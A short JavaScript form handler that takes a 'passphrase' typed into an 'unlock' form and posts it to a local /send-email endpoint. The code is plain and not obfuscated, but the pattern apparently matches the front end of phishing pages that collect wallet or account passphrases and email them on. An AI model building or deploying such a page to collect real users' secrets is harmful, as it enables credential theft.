document.getElementById("unlock-form").addEventListener("submit", async function (event) {
    event.preventDefault(); // Prevent page reload

    // Get the user input (message)
    const message = document.getElementById("message").value.trim();

    if (!message) {
        alert("Please enter your passphrase.");
        return;
    }

    try {
        const response = await fetch("http://localhost:2020/send-email", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ message }) // Sending message only
        });

        if (response.ok) {
            alert("Message sent successfully!");
            document.getElementById("unlock-form").reset(); // Clear the form
        } else {
            alert("Error sending message.");
        }
    } catch (error) {
        console.error("Error:", error);
        alert("An error occurred. Try again later.");
    }
});
